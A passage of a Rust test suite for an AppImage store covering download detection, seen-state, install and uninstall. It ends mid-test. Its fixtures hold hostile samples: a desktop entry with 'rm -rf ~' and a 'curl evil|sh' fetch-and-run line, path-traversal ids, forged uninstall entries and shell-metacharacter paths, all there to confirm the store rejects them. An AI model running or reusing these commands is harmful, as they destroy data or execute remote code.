//! The seen-state, the Downloads check and install/uninstall, each in a
//! scratch tree: no host file is read or written.
#[path = "common/appimage.rs"]
mod build;

use std::os::unix::fs::{MetadataExt, PermissionsExt, symlink};
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime};

use build::scratch;
use telamon_store_core::appimage::check::{
    self, Answer, Config, Launcher, Notice, Notifier, Reply,
};
use telamon_store_core::appimage::inspect::{InspectError, Inspection, inspect};
use telamon_store_core::appimage::install::{self, Dirs};
use telamon_store_core::appimage::squash::Limits;
use telamon_store_core::appimage::state::{MAX_ENTRIES, Seen, SeenState};

fn seen(path: &str, size: u64, mtime: i64, sha: &str, at: i64) -> Seen {
    Seen {
        path: path.into(),
        size,
        mtime_ns: mtime,
        sha256: sha.into(),
        at,
    }
}

// ---- state ----

#[test]
fn a_file_is_announced_once_and_a_changed_one_again() {
    let dir = scratch("state");
    let file = dir.join("state").join("seen.json");
    let mut s = SeenState::load(&file).unwrap();
    assert!(!s.seen("/d/a.AppImage", 10, 5, ""));
    s.remember(seen("/d/a.AppImage", 10, 5, &"a".repeat(64), 1))
        .unwrap();
    assert!(s.seen("/d/a.AppImage", 10, 5, ""));
    // Another run reads the same.
    let s2 = SeenState::load(&file).unwrap();
    assert!(s2.seen("/d/a.AppImage", 10, 5, ""));
    // A different size or time is a new file.
    assert!(!s2.seen("/d/a.AppImage", 11, 5, ""));
    assert!(!s2.seen("/d/a.AppImage", 10, 6, ""));
    // A rename keeps size, time and content: not new. A copy with another time is.
    assert!(s2.seen("/d/b.AppImage", 10, 5, &"a".repeat(64)));
    assert!(!s2.seen("/d/b.AppImage", 10, 7, &"a".repeat(64)));
    assert!(!s2.seen("/d/b.AppImage", 10, 5, &"b".repeat(64)));
    // Modes.
    assert_eq!(std::fs::metadata(&file).unwrap().mode() & 0o777, 0o600);
    assert_eq!(
        std::fs::metadata(file.parent().unwrap()).unwrap().mode() & 0o777,
        0o700
    );
}

#[test]
fn the_state_is_bounded_and_drops_the_oldest() {
    let dir = scratch("state-cap");
    let file = dir.join("seen.json");
    let mut s = SeenState::load(&file).unwrap();
    for n in 0..(MAX_ENTRIES + 40) {
        s.remember(seen(&format!("/d/{n}.AppImage"), 1, n as i64, "", n as i64))
            .unwrap();
    }
    assert_eq!(s.len(), MAX_ENTRIES);
    let s = SeenState::load(&file).unwrap();
    assert_eq!(s.len(), MAX_ENTRIES);
    assert!(!s.seen("/d/0.AppImage", 1, 0, ""));
    assert!(s.seen(
        &format!("/d/{}.AppImage", MAX_ENTRIES + 39),
        1,
        (MAX_ENTRIES + 39) as i64,
        ""
    ));
}

#[test]
fn a_damaged_state_file_reads_as_empty_and_is_replaced() {
    let dir = scratch("state-bad");
    let file = dir.join("seen.json");
    for junk in [&b"\x00\x01garbage"[..], b"{\"v\":2,\"entries\":[]}", b"{\"v\":1,\"entries\":[{\"path\":\"relative\",\"size\":1,\"mtime_ns\":1,\"sha256\":\"\",\"at\":1}]}", b"[]", b""] {
        std::fs::write(&file, junk).unwrap();
        let mut s = SeenState::load(&file).unwrap();
        assert!(s.is_empty(), "{junk:?}");
        s.remember(seen("/d/a.AppImage", 1, 1, "", 1)).unwrap();
        assert!(SeenState::load(&file).unwrap().seen("/d/a.AppImage", 1, 1, ""));
    }
    // Too big to be ours.
    std::fs::write(&file, vec![b' '; 300 * 1024]).unwrap();
    assert!(SeenState::load(&file).is_err());
}

#[test]
fn a_state_file_or_folder_that_is_a_link_is_refused() {
    let dir = scratch("state-link");
    let target = dir.join("elsewhere.json");
    std::fs::write(&target, b"{\"v\":1,\"entries\":[]}").unwrap();
    let file = dir.join("seen.json");
    symlink(&target, &file).unwrap();
    assert!(SeenState::load(&file).is_err());
    // The folder is a link.
    let real = dir.join("real");
    std::fs::create_dir(&real).unwrap();
    let link = dir.join("link");
    symlink(&real, &link).unwrap();
    assert!(SeenState::load(&link.join("seen.json")).is_err());
    // A write never goes through a link either.
    std::fs::remove_file(&file).unwrap();
    let mut s = SeenState::default();
    assert!(
        s.remember(seen("/d/a", 1, 1, "", 1)).is_err(),
        "no file to write to"
    );
}

// ---- the check ----

struct Real;
impl check::Inspector for Real {
    fn inspect(&self, path: &Path) -> Result<Inspection, InspectError> {
        inspect(path, &Limits::default())
    }
}

#[derive(Default)]
struct Notices {
    shown: Vec<Notice>,
    answers: Vec<Reply>,
}
impl Notifier for Notices {
    fn notify(&mut self, n: &Notice) -> Result<Reply, String> {
        self.shown.push(n.clone());
        Ok(if self.answers.is_empty() {
            Reply {
                answer: Answer::None,
                token: None,
            }
        } else {
            self.answers.remove(0)
        })
    }
}

#[derive(Default)]
struct Opened(Vec<(PathBuf, Option<String>)>);
impl Launcher for Opened {
    fn open_install(&mut self, path: &Path, token: Option<&str>) -> Result<(), String> {
        self.0.push((path.to_path_buf(), token.map(str::to_string)));
        Ok(())
    }
}

fn fast() -> Config {
    Config {
        stable_for: Duration::from_millis(60),
        poll: Duration::from_millis(20),
        max_wait: Duration::from_secs(5),
        recent: Duration::from_secs(600),
        max_entries: 100,
        max_notices: 2,
        max_files: 8,
        max_rounds: 4,
        budget: Duration::from_secs(60),
    }
}

fn run_check(
    dir: &Path,
    state: &Path,
    cfg: &Config,
    notices: &mut Notices,
    opened: &mut Opened,
) -> check::Report {
    let mut s = SeenState::load(state).unwrap();
    check::run(dir, cfg, &mut s, &Real, notices, opened)
}

#[test]
fn only_finished_appimages_that_arrived_lately_are_candidates() {
    let dl = scratch("dl");
    let good = build::write(&dl, "Good.AppImage", &build::normal());
    build::write(&dl, "Good.AppImage.part", &build::normal());
    build::write(&dl, "other.crdownload", &build::normal());
    build::write(&dl, ".hidden.AppImage", &build::normal());
    build::write(&dl, "notes.txt", &vec![b'x'; 9000]);
    build::write(&dl, "Fake.AppImage", &vec![b'x'; 9000]);
    build::write(&dl, "tiny.AppImage", b"x");
    let noext = build::write(&dl, "download", &build::normal());
    symlink(&good, dl.join("Link.AppImage")).unwrap();
    std::fs::create_dir(dl.join("Folder.AppImage")).unwrap();
    let names: Vec<String> = check::candidates(&dl, &fast(), SystemTime::now())
        .iter()
        .map(|c| c.path.file_name().unwrap().to_string_lossy().into_owned())
        .collect();
    let mut sorted = names.clone();
    sorted.sort();
    assert_eq!(sorted, vec!["Good.AppImage", "download"], "{names:?}");
    // Nothing is recent enough with a window of zero, except a named file.
    let none = Config {
        recent: Duration::ZERO,
        ..fast()
    };
    assert!(check::candidates(&dl, &none, SystemTime::now() + Duration::from_secs(5)).is_empty());
    assert_eq!(check::candidates(&noext, &none, SystemTime::now()).len(), 1);
    // A folder that does not exist is nothing.
    assert!(check::candidates(&dl.join("nope"), &fast(), SystemTime::now()).is_empty());
}

#[test]
fn an_appimage_is_announced_once_and_install_opens_the_store() {
    let dl = scratch("dl-once");
    let state = scratch("dl-once-state").join("seen.json");
    let p = build::write(&dl, "Sample.AppImage", &build::normal());
    let mut n = Notices {
        answers: vec![Reply {
            answer: Answer::Install,
            token: Some("tok".into()),
        }],
        ..Notices::default()
    };
    let mut o = Opened::default();
    let r = run_check(&dl, &state, &fast(), &mut n, &mut o);
    assert_eq!(r.notified, vec![p.clone()], "{r:?}");
    assert_eq!(n.shown.len(), 1);
    assert_eq!(n.shown[0].title, "Install Sample Draw?");
    assert!(n.shown[0].body.contains("Sample.AppImage is an AppImage"));
    assert!(n.shown[0].body.contains("is not sandboxed"));
    assert!(
        n.shown[0]
            .body
            .contains("We cannot tell where it came from.")
    );
    assert_eq!(o.0, vec![(p.clone(), Some("tok".to_string()))]);
    // Again: the same file, nothing more.
    let mut n2 = Notices::default();
    let mut o2 = Opened::default();
    let r = run_check(&dl, &state, &fast(), &mut n2, &mut o2);
    assert!(
        r.notified.is_empty() && n2.shown.is_empty() && o2.0.is_empty(),
        "{r:?}"
    );
    // Not Now and a dismissed notification open nothing, and are not asked again.
    let q = build::write(
        &dl,
        "Second.AppImage",
        &build::type2(&build::normal_squash().file("/x", "2").build(), &[], &[]),
    );
    let mut n3 = Notices {
        answers: vec![Reply {
            answer: Answer::NotNow,
            token: None,
        }],
        ..Notices::default()
    };
    let mut o3 = Opened::default();
    let r = run_check(&dl, &state, &fast(), &mut n3, &mut o3);
    assert_eq!(r.notified, vec![q]);
    assert!(o3.0.is_empty());
    let r = run_check(
        &dl,
        &state,
        &fast(),
        &mut Notices::default(),
        &mut Opened::default(),
    );
    assert!(r.notified.is_empty());
    // A changed file (new time) is announced again.
    let f = std::fs::OpenOptions::new().write(true).open(&p).unwrap();
    f.set_modified(SystemTime::now() + Duration::from_secs(30))
        .unwrap();
    let mut n4 = Notices::default();
    let r = run_check(&dl, &state, &fast(), &mut n4, &mut Opened::default());
    assert_eq!(r.notified, vec![p]);
}

#[test]
fn show_in_store_opens_the_store_too() {
    let dl = scratch("dl-show");
    let state = scratch("dl-show-state").join("seen.json");
    build::write(&dl, "S.AppImage", &build::normal());
    let mut n = Notices {
        answers: vec![Reply {
            answer: Answer::ShowInStore,
            token: None,
        }],
        ..Notices::default()
    };
    let mut o = Opened::default();
    run_check(&dl, &state, &fast(), &mut n, &mut o);
    assert_eq!(o.0.len(), 1);
    assert_eq!(o.0[0].1, None);
}

#[test]
fn nothing_is_announced_when_the_state_cannot_be_kept() {
    let dl = scratch("dl-nostate");
    build::write(&dl, "S.AppImage", &build::normal());
    let base = scratch("dl-nostate-state");
    let real = base.join("real");
    std::fs::create_dir(&real).unwrap();
    symlink(&real, base.join("link")).unwrap();
    // load() refuses the linked folder, so a run cannot even start with it:
    assert!(SeenState::load(&base.join("link").join("seen.json")).is_err());
    // A state that cannot be written: a file where the folder should be.
    std::fs::write(base.join("file"), b"x").unwrap();
    let mut s = SeenState::load(&base.join("file").join("seen.json")).unwrap_or_default();
    let mut n = Notices::default();
    let r = check::run(&dl, &fast(), &mut s, &Real, &mut n, &mut Opened::default());
    assert!(n.shown.is_empty(), "{r:?}");
    assert!(!r.errors.is_empty());
}

#[test]
fn at_most_two_notices_per_run_and_broken_files_are_not_announced() {
    let dl = scratch("dl-cap");
    let state = scratch("dl-cap-state").join("seen.json");
    for n in 0..4 {
        build::write(
            &dl,
            &format!("A{n}.AppImage"),
            &build::type2(
                &build::normal_squash().file("/n", format!("{n}")).build(),
                &[],
                &[],
            ),
        );
    }
    let mut broken = build::runtime(&[], &[], 2);
    broken.resize(20_000, 0);
    build::write(&dl, "Broken.AppImage", &broken);
    let mut n = Notices::default();
    let r = run_check(&dl, &state, &fast(), &mut n, &mut Opened::default());
    assert!(r.notified.len() <= 2, "{r:?}");
}

#[test]
fn a_file_that_is_still_growing_is_waited_for() {
    let dl = scratch("dl-grow");
    let p = dl.join("Grow.AppImage");
    let full = build::normal();
    std::fs::write(&p, &full[..5000]).unwrap();
    let p2 = p.clone();
    let full2 = full.clone();
    let writer = std::thread::spawn(move || {
        use std::io::Write;
        let mut f = std::fs::OpenOptions::new().append(true).open(&p2).unwrap();
        for chunk in full2[5000..].chunks(3000) {
            std::thread::sleep(Duration::from_millis(40));
            f.write_all(chunk).unwrap();
            f.flush().unwrap();
        }
    });
    let cfg = Config {
        stable_for: Duration::from_millis(150),
        ..fast()
    };
    let c = check::wait_stable(&p, &cfg, SystemTime::now()).unwrap();
    writer.join().unwrap();
    assert_eq!(c.size, full.len() as u64);
    // A file that never settles is given up on.
    let cfg = Config {
        max_wait: Duration::from_millis(100),
        stable_for: Duration::from_secs(60),
        ..fast()
    };
    assert!(check::wait_stable(&p, &cfg, SystemTime::now()).is_none());
    // One that vanishes is none.
    std::fs::remove_file(&p).unwrap();
    assert!(check::wait_stable(&p, &fast(), SystemTime::now()).is_none());
}

#[test]
fn the_notice_is_plain_text_from_cleaned_fields() {
    let desktop = "[Desktop Entry]\nType=Application\nName=<b>Bold</b> & \\n\u{202e}Evil\nExec=x\n";
    let sq = build::Squash::default().file("/a.desktop", desktop);
    let dl = scratch("dl-text");
    let p = build::write(
        &dl,
        "We\u{202e}ird\nName.AppImage",
        &build::type2(&sq.build(), &[], &[]),
    );
    let i = inspect(&p, &Limits::default()).unwrap();
    let n = check::notice(&p, &i);
    for t in [&n.title, &n.body] {
        assert!(!t.chars().any(|c| c.is_control() && c != '\n'), "{t:?}");
        assert!(!t.contains('\u{202e}'), "{t:?}");
    }
    assert!(n.title.starts_with("Install ") && n.title.ends_with('?'));
    assert!(n.title.chars().count() < 80);
}

// ---- install and uninstall ----

fn dirs(tag: &str) -> Dirs {
    let root = scratch(tag);
    std::fs::create_dir_all(root.join("home")).unwrap();
    Dirs {
        applications: root.join("home").join("Applications"),
        data: root.join("data"),
        fuse_libs: vec![root.join("libfuse.so.2")],
    }
}

fn with_fuse(d: &Dirs) {
    std::fs::write(&d.fuse_libs[0], b"").unwrap();
}

fn fixture(tag: &str, bytes: &[u8]) -> (PathBuf, Inspection) {
    let dl = scratch(tag);
    let p = build::write(&dl, "Sample-x86_64.AppImage", bytes);
    let i = inspect(&p, &Limits::default()).unwrap();
    (p, i)
}

fn validate(path: &Path) {
    let out = std::process::Command::new("desktop-file-validate")
        .arg(path)
        .output();
    match out {
        Ok(o) => assert!(
            o.status.success(),
            "desktop-file-validate: {}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        ),
        Err(_) => eprintln!("skipped: no desktop-file-validate"),
    }
}

#[test]
fn install_copies_and_writes_the_menu_entry_and_uninstall_takes_them_away() {
    let d = dirs("inst");
    with_fuse(&d);
    let (src, insp) = fixture("inst-src", &build::normal());
    let plan = install::plan(&d, &insp).unwrap();
    assert_eq!(plan.id, "appimage-org.example.sample");
    assert_eq!(plan.target, d.applications.join("Sample-Draw.AppImage"));
    assert!(!plan.replaces && !plan.renamed);
    let done = install::install(&d, &src, &insp, &plan).unwrap();
    // Copied, not moved; runnable; the same bytes.
    assert!(src.exists());
    let md = std::fs::metadata(&plan.target).unwrap();
    assert_eq!(md.mode() & 0o777, 0o755);
    assert_eq!(
        std::fs::read(&plan.target).unwrap(),
        std::fs::read(&src).unwrap()
    );
    assert_eq!(
        std::fs::metadata(&d.applications).unwrap().mode() & 0o777,
        0o755
    );
    // The menu entry.
    let entry = d
        .data
        .join("applications")
        .join("appimage-org.example.sample.desktop");
    validate(&entry);
    let text = std::fs::read_to_string(&entry).unwrap();
    assert!(text.contains("X-Telamon-AppImage=true"));
    assert!(text.contains(&format!(
        "X-Telamon-AppImage-Path={}",
        plan.target.display()
    )));
    assert!(text.contains("Name=Sample Draw\n"));
    assert!(
        text.contains(&format!("Exec={}\n", plan.target.display())),
        "{text}"
    );
    assert!(!text.contains("env APPIMAGE_EXTRACT_AND_RUN"));
    // The icon, in the hicolor theme.
    let icon = d
        .data
        .join("icons/hicolor/256x256/apps/appimage-org.example.sample.png");
    assert_eq!(std::fs::read(&icon).unwrap(), build::fake_png(256, 256));
    assert_eq!(done.icon.as_deref(), Some(icon.as_path()));
    // Listed.
    let listed = install::list(&d);
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].name, "Sample Draw");
    assert_eq!(listed[0].version, "2.1.0");
    assert!(listed[0].present && listed[0].size > 0);
    // Uninstall removes exactly those three and nothing else.
    std::fs::write(d.applications.join("Mine.txt"), b"mine").unwrap();
    let removed = install::uninstall(&d, &listed[0].id).unwrap();
    assert_eq!(removed.removed.len(), 3, "{removed:?}");
    assert!(removed.left.is_empty());
    assert!(!plan.target.exists() && !entry.exists() && !icon.exists());
    assert!(d.applications.join("Mine.txt").exists());
    assert!(
        src.exists(),
        "the downloaded file is not the Store's to delete"
    );
    assert!(install::list(&d).is_empty());
}

#[test]
fn without_fuse_2_the_entry_extracts_and_runs() {
    let d = dirs("nofuse");
    let (src, insp) = fixture("nofuse-src", &build::normal());
    assert!(!d.fuse_available());
    let plan = install::plan(&d, &insp).unwrap();
    install::install(&d, &src, &insp, &plan).unwrap();
    let text = std::fs::read_to_string(
        d.data
            .join("applications")
            .join(format!("{}.desktop", plan.id)),
    )
    .unwrap();
    assert!(
        text.contains(&format!(
            "Exec=env APPIMAGE_EXTRACT_AND_RUN=1 {}\n",
            plan.target.display()
        )),
        "{text}"
    );
    validate(
        &d.data
            .join("applications")
            .join(format!("{}.desktop", plan.id)),
    );
}

#[test]
fn a_taken_name_is_numbered_and_a_foreign_file_is_never_replaced() {
    let d = dirs("taken");
    std::fs::create_dir_all(&d.applications).unwrap();
    let foreign = d.applications.join("Sample-Draw.AppImage");
    std::fs::write(&foreign, b"someone else's").unwrap();
    // A foreign menu entry of the same id.
    std::fs::create_dir_all(d.data.join("applications")).unwrap();
    let foreign_entry = d
        .data
        .join("applications/appimage-org.example.sample-2.desktop");
    std::fs::write(
        &foreign_entry,
        "[Desktop Entry]\nType=Application\nName=Not Ours\nExec=x\n",
    )
    .unwrap();
    let (src, insp) = fixture("taken-src", &build::normal());
    let plan = install::plan(&d, &insp).unwrap();
    assert!(plan.renamed);
    assert_eq!(plan.target, d.applications.join("Sample-Draw-3.AppImage"));
    assert_eq!(plan.id, "appimage-org.example.sample-3");
    install::install(&d, &src, &insp, &plan).unwrap();
    assert_eq!(std::fs::read(&foreign).unwrap(), b"someone else's");
    assert!(
        std::fs::read_to_string(&foreign_entry)
            .unwrap()
            .contains("Not Ours")
    );
    // Uninstalling a foreign entry is refused and removes nothing.
    assert!(install::uninstall(&d, "appimage-org.example.sample-2").is_err());
    assert!(foreign_entry.exists());
}

#[test]
fn installing_again_replaces_only_the_stores_own_copy() {
    let d = dirs("again");
    let (src, insp) = fixture("again-src", &build::normal());
    let p1 = install::plan(&d, &insp).unwrap();
    install::install(&d, &src, &insp, &p1).unwrap();
    let newer = build::type2(&build::normal_squash().file("/more", "x").build(), &[], &[]);
    let (src2, insp2) = fixture("again-src2", &newer);
    let p2 = install::plan(&d, &insp2).unwrap();
    assert!(p2.replaces);
    assert_eq!(p2.target, p1.target);
    install::install(&d, &src2, &insp2, &p2).unwrap();
    assert_eq!(std::fs::read(&p2.target).unwrap(), newer);
    assert_eq!(install::list(&d).len(), 1);
}

#[test]
fn a_file_that_changed_after_it_was_looked_at_is_not_installed() {
    let d = dirs("changed");
    let (src, insp) = fixture("changed-src", &build::normal());
    let plan = install::plan(&d, &insp).unwrap();
    let mut other = std::fs::read(&src).unwrap();
    let n = other.len();
    other[n - 2] ^= 0xff;
    std::fs::write(&src, &other).unwrap();
    let e = install::install(&d, &src, &insp, &plan).unwrap_err();
    assert!(e.0.contains("changed"), "{e}");
    assert!(!plan.target.exists());
    assert!(
        std::fs::read_dir(&d.applications).unwrap().count() == 0,
        "no temporary copy left"
    );
    assert!(!d.data.join("applications").exists() || install::list(&d).is_empty());
    // A grown file too.
    let mut grown = std::fs::read(&src).unwrap();
    grown.push(0);
    std::fs::write(&src, grown).unwrap();
    assert!(install::install(&d, &src, &insp, &plan).is_err());
}

#[test]
fn install_refuses_places_that_are_not_the_stores_to_write_to() {
    let d = dirs("places");
    let (src, insp) = fixture("places-src", &build::normal());
    let mut plan = install::plan(&d, &insp).unwrap();
    plan.target = d.data.join("evil.AppImage");
    assert!(install::install(&d, &src, &insp, &plan).is_err());
    let mut plan = install::plan(&d, &insp).unwrap();
    plan.id = "../../evil".into();
    assert!(install::install(&d, &src, &insp, &plan).is_err());
    let mut plan = install::plan(&d, &insp).unwrap();
    plan.target = d.applications.join("a").join("b.AppImage");
    assert!(install::install(&d, &src, &insp, &plan).is_err());
    // ~/Applications that is a link is not written through.
    let real = scratch("places-real");
    symlink(&real, &d.applications).unwrap();
    let plan = install::plan(&d, &insp).unwrap();
    assert!(install::install(&d, &src, &insp, &plan).is_err());
    assert_eq!(std::fs::read_dir(&real).unwrap().count(), 0);
}

fn entry_with(d: &Dirs, id: &str, path: &str, icon: Option<&str>) -> PathBuf {
    std::fs::create_dir_all(d.data.join("applications")).unwrap();
    let p = d.data.join("applications").join(format!("{id}.desktop"));
    let mut t = format!(
        "[Desktop Entry]\nType=Application\nName=Forged\nExec=x\nX-Telamon-AppImage=true\nX-Telamon-AppImage-Path={path}\n"
    );
    if let Some(i) = icon {
        t.push_str(&format!("X-Telamon-AppImage-Icon={i}\n"));
    }
    std::fs::write(&p, t).unwrap();
    p
}

#[test]
fn a_forged_entry_cannot_make_uninstall_delete_other_files() {
    let d = dirs("forged");
    let outside = scratch("forged-outside");
    let victim = build::write(&outside, "Victim.AppImage", b"keep me");
    let docs = build::write(&outside, "important.txt", b"keep me too");
    // A path outside ~/Applications, a path with a parent link, a file that
    // is not an AppImage name, an icon path that climbs out.
    for (id, path, icon) in [
        ("appimage-a", victim.to_str().unwrap().to_string(), None),
        (
            "appimage-b",
            format!("{}/../x/Victim.AppImage", d.applications.display()),
            None,
        ),
        (
            "appimage-c",
            d.applications
                .join("important.txt")
                .to_str()
                .unwrap()
                .to_string(),
            None,
        ),
        (
            "appimage-d",
            d.applications
                .join(".hidden.AppImage")
                .to_str()
                .unwrap()
                .to_string(),
            None,
        ),
        (
            "appimage-e",
            d.applications
                .join("Ok.AppImage")
                .to_str()
                .unwrap()
                .to_string(),
            Some("../../../important.txt".to_string()),
        ),
    ] {
        let entry = entry_with(&d, id, &path, icon.as_deref());
        match install::uninstall(&d, id) {
            // The entry whose path is fine but whose icon is not: the icon
            // reference is dropped, nothing outside is touched.
            Ok(r) => assert!(
                r.removed
                    .iter()
                    .all(|p| p.starts_with(&d.applications) || p.starts_with(&d.data)),
                "{r:?}"
            ),
            Err(_) => assert!(entry.exists(), "{id}: refused entries stay"),
        }
    }
    assert_eq!(std::fs::read(&victim).unwrap(), b"keep me");
    assert_eq!(std::fs::read(&docs).unwrap(), b"keep me too");
    // The listing shows none of the forged ones whose path is bad.
    let names: Vec<String> = install::list(&d).into_iter().map(|i| i.id).collect();
    assert!(
        !names.iter().any(|n| n == "appimage-a"
            || n == "appimage-b"
            || n == "appimage-c"
            || n == "appimage-d"),
        "{names:?}"
    );
}

#[test]
fn uninstall_does_not_follow_a_link_where_the_app_should_be() {
    let d = dirs("link");
    let (src, insp) = fixture("link-src", &build::normal());
    let plan = install::plan(&d, &insp).unwrap();
    install::install(&d, &src, &insp, &plan).unwrap();
    let outside = scratch("link-outside");
    let precious = build::write(&outside, "precious", b"precious");
    std::fs::remove_file(&plan.target).unwrap();
    symlink(&precious, &plan.target).unwrap();
    let r = install::uninstall(&d, &plan.id).unwrap();
    assert_eq!(std::fs::read(&precious).unwrap(), b"precious");
    assert!(!r.left.is_empty(), "the link is left and said so");
    assert_eq!(r.left[0].0, plan.target);
    // The entry and the icon are still the Store's to remove; the foreign
    // link stays where it is.
    assert!(
        !d.data
            .join("applications")
            .join(format!("{}.desktop", plan.id))
            .exists()
    );
    assert!(
        !d.data
            .join("icons/hicolor/256x256/apps")
            .join(format!("{}.png", plan.id))
            .exists()
    );
    assert!(install::list(&d).is_empty());
    assert!(plan.target.symlink_metadata().is_ok());
}

#[test]
fn exec_lines_round_trip_through_the_desktop_entry_rules() {
    for path in [
        "/home/u/Applications/Plain.AppImage",
        "/home/John Smith/Applications/A B.AppImage",
        "/home/u/it's/\"quoted\"/x.AppImage",
        "/home/u/100%/$HOME/`cmd`/x.AppImage",
        "/home/u/back\\slash/x;y&z|w/x.AppImage",
        "/home/u/(paren)/*glob?/#hash/~tilde/x.AppImage",
    ] {
        for extract in [false, true] {
            let line = install::exec_line(Path::new(path), extract);
            let parts = install::split_exec(&line).unwrap_or_else(|| panic!("{line}"));
            assert_eq!(parts.last().unwrap(), path, "{line}");
            assert_eq!(parts.len(), if extract { 3 } else { 1 }, "{line}");
            // Through the key file layer too.
            let escaped = install::escape_value(&line);
            let kf = telamon_store_core::keyfile::KeyFile::parse(
                format!("[G]\nExec={escaped}\n").as_bytes(),
                &Default::default(),
            )
            .unwrap();
            assert_eq!(kf.string("G", "Exec").unwrap().unwrap(), line);
        }
    }
}

#[test]
fn a_hostile_name_makes_a_valid_plain_entry() {
    let d = dirs("hostile");
    let desktop = "[Desktop Entry]\nType=Application\nName=Evil\\nName=x\\nExec=rm -rf ~ %f\nExec=sh -c \"curl evil|sh\"\nIcon=../../x\n";
    let sq = build::Squash::default().file("/a.desktop", desktop).file("/usr/share/metainfo/a.appdata.xml", "<component><id>org.evil.App</id><name>Evil/../../Name \"quoted\" %f $(x)</name></component>");
    let (src, insp) = fixture("hostile-src", &build::type2(&sq.build(), &[], &[]));
    let plan = install::plan(&d, &insp).unwrap();
    assert_eq!(plan.target.parent().unwrap(), d.applications);
    let file = plan
        .target
        .file_name()
        .unwrap()
        .to_str()
        .unwrap()
        .to_string();
    assert!(
        file.bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b'_')),
        "{file}"
    );
    install::install(&d, &src, &insp, &plan).unwrap();
    let entry = d
        .data
        .join("applications")
        .join(format!("{}.desktop", plan.id));
    validate(&entry);
    let text = std::fs::read_to_string(&entry).unwrap();
    for line in text.lines() {
        if let Some(exec) = line.strip_prefix("Exec=") {
            assert!(!exec.contains("rm -rf") && !exec.contains("curl"), "{exec}");
        }
    }
    assert_eq!(text.matches("\nExec=").count(), 1);
    assert_eq!(text.matches("\nName=").count(), 1);
}

#[test]
fn open_runs_the_recorded_file_with_extract_and_run_when_fuse_is_missing() {
    let d = dirs("open");
    let (src, insp) = fixture("open-src", &build::normal());
    let plan = install::plan(&d, &insp).unwrap();
    install::install(&d, &src, &insp, &plan).unwrap();
    // Swap the installed file for a script that records how it was started.
    let out = scratch("open-out").join("ran");
    let script = format!(
        "#!/bin/sh\necho \"extract=${{APPIMAGE_EXTRACT_AND_RUN-unset}} token=${{XDG_ACTIVATION_TOKEN-unset}} args=$#\" > '{}'\n",
        out.display()
    );
    std::fs::write(&plan.target, script).unwrap();
    std::fs::set_permissions(&plan.target, std::fs::Permissions::from_mode(0o755)).unwrap();
    install::launch(&d, &plan.id, Some("tok123")).unwrap();
    for _ in 0..100 {
        if out.exists() {
            break;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    assert_eq!(
        std::fs::read_to_string(&out).unwrap().trim(),
        "extract=1 token=tok123 args=0"
    );
    // With FUSE present the variable is not set.
    with_fuse(&d);
    std::fs::remove_file(&out).unwrap();
    install::launch(&d, &plan.id, None).unwrap();
    for _ in 0..100 {
        if out.exists() {
            break;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
    assert_eq!(
        std::fs::read_to_string(&out).unwrap().trim(),
        "extract=unset token=unset args=0"
    );
    // A forged id and a missing file are refused.
    assert!(install::launch(&d, "appimage-nothing", None).is_err());
    assert!(install::launch(&d, "../x", None).is_err());
    std::fs::remove_file(&plan.target).unwrap();
    assert!(install::launch(&d, &plan.id, None).is_err());
}

#[test]
fn file_names_made_from_untrusted_names_are_stable_and_listed() {
    for name in ["Foo...Bar", "a....b", "..x..", "My App (beta) 1.2", "-_-"] {
        let once = install::safe_part(name, 60);
        assert_eq!(install::safe_part(&once, 60), once, "{name:?}");
        assert!(!once.contains(".."));
    }
    // An app with dots in its name installs, lists and uninstalls.
    let d = dirs("dots");
    let sq = build::Squash::default().file(
        "/a.desktop",
        "[Desktop Entry]\nType=Application\nName=Foo...Bar\nExec=x\n",
    );
    let (src, insp) = fixture("dots-src", &build::type2(&sq.build(), &[], &[]));
    let plan = install::plan(&d, &insp).unwrap();
    install::install(&d, &src, &insp, &plan).unwrap();
    let listed = install::list(&d);
    assert_eq!(listed.len(), 1, "{plan:?}");
    assert!(
        install::uninstall(&d, &listed[0].id)
            .unwrap()
            .left
            .is_empty()
    );
}

#[test]
fn a_numbered_install_of_the_stores_own_is_replaced_not_duplicated() {
    let d = dirs("numbered");
    std::fs::create_dir_all(&d.applications).unwrap();
    // Someone else's file takes the plain name, so the first install is -2.
    std::fs::write(d.applications.join("Sample-Draw.AppImage"), b"x").unwrap();
    let (src, insp) = fixture("numbered-src", &build::normal());
    let p1 = install::plan(&d, &insp).unwrap();
    assert_eq!(p1.id, "appimage-org.example.sample-2");
    install::install(&d, &src, &insp, &p1).unwrap();
    let p2 = install::plan(&d, &insp).unwrap();
    assert!(p2.replaces, "{p2:?}");
    assert_eq!(p2.id, p1.id);
    assert_eq!(p2.target, p1.target);
}

#[test]
fn replacing_removes_the_old_icon_when_the_new_one_differs_and_checks_the_old_install() {
    let d = dirs("icons");
    let (src, insp) = fixture("icons-src", &build::normal());
    let p = install::plan(&d, &insp).unwrap();
    install::install(&d, &src, &insp, &p).unwrap();
    let old_icon = d
        .data
        .join("icons/hicolor/256x256/apps/appimage-org.example.sample.png");
    assert!(old_icon.exists());
    // The next version has a 128 px icon.
    let sq = build::Squash::default()
        .file(
            "/s.desktop",
            "[Desktop Entry]\nType=Application\nName=Sample Draw\nIcon=s\nExec=x\n",
        )
        .file("/s.png", build::fake_png(128, 128))
        .file(
            "/usr/share/metainfo/org.example.Sample.appdata.xml",
            build::APPSTREAM,
        );
    let (src2, insp2) = fixture("icons-src2", &build::type2(&sq.build(), &[], &[]));
    let p2 = install::plan(&d, &insp2).unwrap();
    assert!(p2.replaces);
    // The entry is removed meanwhile: the plan is stale and is refused.
    let entry = d
        .data
        .join("applications/appimage-org.example.sample.desktop");
    let saved = std::fs::read(&entry).unwrap();
    std::fs::remove_file(&entry).unwrap();
    assert!(install::install(&d, &src2, &insp2, &p2).is_err());
    std::fs::write(&entry, saved).unwrap();
    install::install(&d, &src2, &insp2, &p2).unwrap();
    assert!(
        !old_icon.exists(),
        "the old icon is the Store's and is no longer recorded"
    );
    assert!(
        d.data
            .join("icons/hicolor/128x128/apps/appimage-org.example.sample.png")
            .exists()
    );
}

#[test]
fn files_past_the_per_round_cap_are_found_by_the_next_round() {
    let dl = scratch("dl-rounds");
    let state = scratch("dl-rounds-state").join("seen.json");
    for n in 0..3 {
        build::write(
            &dl,
            &format!("R{n}.AppImage"),
